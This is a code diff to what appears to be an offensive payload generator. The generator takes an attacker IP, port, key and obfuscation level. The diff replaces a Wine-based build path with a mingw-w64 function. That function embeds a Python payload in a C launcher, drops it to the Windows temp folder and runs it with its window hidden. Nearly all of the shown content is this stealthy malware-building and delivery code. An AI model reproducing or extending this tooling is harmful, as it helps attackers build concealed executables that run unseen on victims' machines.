@@ -436,81 +436,6 @@ def obfuscate_packed(code):
     return stub
 
 
-WINE_PYTHON_URL = "https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip"
-GET_PIP_URL = "https://bootstrap.pypa.io/get-pip.py"
-ENTROPY_DIR = os.path.expanduser("~/.entropy")
-
-
-def _ensure_wine_python(verbose=True):
-    """Download and set up portable Windows Python + PyInstaller via Wine."""
-    wdir = os.path.join(ENTROPY_DIR, "wine_python")
-    os.makedirs(wdir, exist_ok=True)
-    python_exe = os.path.join(wdir, "python.exe")
-
-    if os.path.exists(python_exe):
-        return python_exe
-
-    if verbose:
-        print("  [*] Setting up portable Windows Python (first time)...")
-
-    import urllib.request
-    import zipfile
-
-    # Download embeddable Python
-    zip_path = os.path.join(ENTROPY_DIR, "python.zip")
-    try:
-        if verbose:
-            print(f"  [*] Downloading embeddable Python 3.12...")
-        urllib.request.urlretrieve(WINE_PYTHON_URL, zip_path)
-        with zipfile.ZipFile(zip_path, "r") as zf:
-            zf.extractall(wdir)
-        os.remove(zip_path)
-    except Exception as e:
-        if verbose:
-            print(f"  [!] Failed to download Python: {e}")
-        return None
-
-    # Rename ._pth to enable site-packages
-    for f in os.listdir(wdir):
-        if f.endswith("._pth"):
-            bak = f.replace("._pth", ".pth.bak")
-            os.rename(os.path.join(wdir, f), os.path.join(wdir, bak))
-            break
-
-    if verbose:
-        print("  [*] Installing pip...")
-    pip_script = os.path.join(ENTROPY_DIR, "get-pip.py")
-    try:
-        urllib.request.urlretrieve(GET_PIP_URL, pip_script)
-        _subprocess.run(
-            ["wine", python_exe, pip_script],
-            capture_output=True, text=True, timeout=120,
-        )
-        os.remove(pip_script)
-    except Exception as e:
-        if verbose:
-            print(f"  [!] Failed to install pip: {e}")
-        if os.path.exists(pip_script):
-            os.remove(pip_script)
-        return None
-
-    if verbose:
-        print("  [*] Installing PyInstaller...")
-    try:
-        _subprocess.run(
-            ["wine", python_exe, "-m", "pip", "install", "pyinstaller"],
-            capture_output=True, text=True, timeout=180,
-        )
-    except Exception as e:
-        if verbose:
-            print(f"  [!] Failed to install PyInstaller: {e}")
-        return None
-
-    if verbose:
-        print("  [*] Wine Python environment ready")
-    return python_exe
-
-
 def _clean_pyinstaller_artifacts(name):
     for p in ["build", name + ".spec"]:
         pth = os.path.join(os.getcwd(), p)
@@ -585,63 +510,97 @@ def try_compile_exe(py_path, output_dir="payloads", verbose=True):
         _clean_pyinstaller_artifacts(name)
 
 
-def compile_windows_via_wine(py_path, output_dir="payloads", verbose=True):
-    """Cross-compile a Windows .exe from Linux using Wine + PyInstaller."""
-    if not shutil.which("wine"):
+def _escape_c_string(text):
+    r = text.replace("\\", "\\\\")
+    r = r.replace("\n", "\\n")
+    r = r.replace("\r", "\\r")
+    r = r.replace("\t", "\\t")
+    r = r.replace('"', '\\"')
+    return r
+
+
+def compile_windows_mingw(py_path, output_dir="payloads", verbose=True):
+    """Cross-compile a Windows .exe from Linux using mingw-w64.
+    Embeds the Python script in a C launcher and compiles to a native PE."""
+    mingw = shutil.which("x86_64-w64-mingw32-gcc")
+    if not mingw:
         if verbose:
-            print("  [!] wine not found. Install it:")
-            print("      sudo apt install wine wine32 wine64")
-            print("  [*] Falling back to .py file only")
+            print("  [!] mingw-w64 not found.")
+            print("      Install: sudo apt install mingw-w64")
         return None
 
     name = os.path.splitext(os.path.basename(py_path))[0]
-    python_exe = _ensure_wine_python(verbose)
-    if not python_exe:
-        return None
-
-    if verbose:
-        print("  [*] Compiling Windows .exe via Wine...")
 
     try:
+        with open(py_path, "r") as f:
+            py_code = f.read()
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Failed to read {py_path}: {e}")
+        return None
+
+    escaped = _escape_c_string(py_code)
+
+    c_src = (
+        '#include <windows.h>\n'
+        '#include <stdio.h>\n'
+        '#define C "' + escaped + '"\n'
+        'int WINAPI WinMain(HINSTANCE h,HINSTANCE hp,LPSTR lp,int ns){\n'
+        'char t[MAX_PATH],p[MAX_PATH],c[1024];DWORD n;\n'
+        'GetTempPathA(sizeof(t),t);\n'
+        'snprintf(p,sizeof(p),"%se.py",t);\n'
+        'HANDLE f=CreateFileA(p,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,'
+        'FILE_ATTRIBUTE_NORMAL,NULL);\n'
+        'if(!f)return 1;\n'
+        'WriteFile(f,C,strlen(C),&n,NULL);\n'
+        'CloseHandle(f);\n'
+        'STARTUPINFOA si={0};PROCESS_INFORMATION pi={0};\n'
+        'si.cb=sizeof(si);si.dwFlags=STARTF_USESHOWWINDOW;si.wShowWindow=SW_HIDE;\n'
+        'snprintf(c,sizeof(c),"python \\"%s\\"",p);\n'
+        'CreateProcessA(NULL,c,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);\n'
+        'CloseHandle(pi.hProcess);CloseHandle(pi.hThread);\n'
+        'return 0;\n'
+        '}\n'
+    )
+
+    src_path = os.path.join(output_dir, "_" + name + ".c")
+    exe_path = os.path.join(output_dir, name + ".exe")
+
+    try:
+        with open(src_path, "w") as f:
+            f.write(c_src)
+
         result = _subprocess.run(
-            [
-                "wine", python_exe, "-m", "PyInstaller",
-                "--onefile", "--noconsole",
-                "--distpath", output_dir,
-                "--name", name,
-                py_path,
-            ],
-            capture_output=True, text=True, timeout=300,
+            [mingw, "-Os", "-s", "-mwindows", "-o", exe_path, src_path],
+            capture_output=True, text=True, timeout=60,
         )
 
         if result.returncode != 0:
             if verbose:
                 err = result.stderr.strip() or result.stdout.strip()
-                print(f"  [!] Wine/PyInstaller error: {err[:500]}")
+                print(f"  [!] mingw-w64 error: {err[:500]}")
             return None
 
-        exe_path = os.path.join(output_dir, name + ".exe")
-        if os.path.exists(exe_path):
-            return exe_path
+        if not os.path.exists(exe_path):
+            if verbose:
+                print("  [!] .exe not found after compilation")
+            return None
 
-        for f in os.listdir(output_dir):
-            if f == name + ".exe":
-                return os.path.join(output_dir, f)
-
-        if verbose:
-            print(f"  [!] .exe not found after compilation")
-        return None
+        return exe_path
 
     except _subprocess.TimeoutExpired:
         if verbose:
-            print("  [!] Compilation timed out (5 min)")
+            print("  [!] Compilation timed out")
         return None
     except Exception as e:
         if verbose:
-            print(f"  [!] Wine compilation error: {e}")
+            print(f"  [!] Compilation error: {e}")
         return None
     finally:
-        _clean_pyinstaller_artifacts(name)
+        try:
+            os.remove(src_path)
+        except Exception:
+            pass
 
 
 def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", compile_exe=False, output_dir="payloads", name=None):
@@ -679,16 +638,18 @@ def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", co
     exe_path = None
     if compile_exe:
         host = sys.platform.lower()
-        native = (os_type == "windows" and host.startswith("win")) or \
-                 (os_type == "linux" and not host.startswith("win"))
+        on_linux = not host.startswith("win")
 
-        if native:
-            print("  [*] Compiling to binary with PyInstaller...")
+        if os_type == "windows" and on_linux:
+            print("  [*] Cross-compiling Windows .exe with mingw-w64...")
+            exe_path = compile_windows_mingw(filepath, output_dir)
+        elif os_type == "linux" and on_linux:
+            print("  [*] Compiling Linux binary with PyInstaller...")
             exe_path = try_compile_exe(filepath, output_dir)
-        elif os_type == "windows":
-            exe_path = compile_windows_via_wine(filepath, output_dir)
+        elif os_type == "windows" and not on_linux:
+            print("  [*] Compiling Windows .exe with PyInstaller...")
+            exe_path = try_compile_exe(filepath, output_dir)
         else:
             print("  [!] Cannot compile Linux binary from Windows.")
-            print("      Use the .py file or compile on Linux.")
 
     return filepath, key.decode(), exe_path
